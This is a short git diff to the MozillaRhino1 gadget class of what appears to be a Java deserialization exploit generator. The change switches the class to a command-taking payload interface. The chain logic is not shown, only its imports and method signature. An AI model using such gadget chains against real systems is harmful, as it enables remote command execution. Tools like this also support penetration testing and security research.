@@ -3,7 +3,7 @@ package com.h2tg.ysogate.payloads.gadgets;
 import com.h2tg.ysogate.utils.PayloadRunner;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.mozilla.javascript.*;
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
@@ -20,7 +20,8 @@ import java.lang.reflect.Method;
 */
 @Dependencies({"rhino:js:1.7R2"})
 @Authors({Authors.MATTHIASKAISER})
-public class MozillaRhino1 implements ObjectPayload<Object> {
+public class MozillaRhino1 implements CommandObjectPayload<Object>
+{
 
 	public Object getObject(final String command) throws Exception {
 
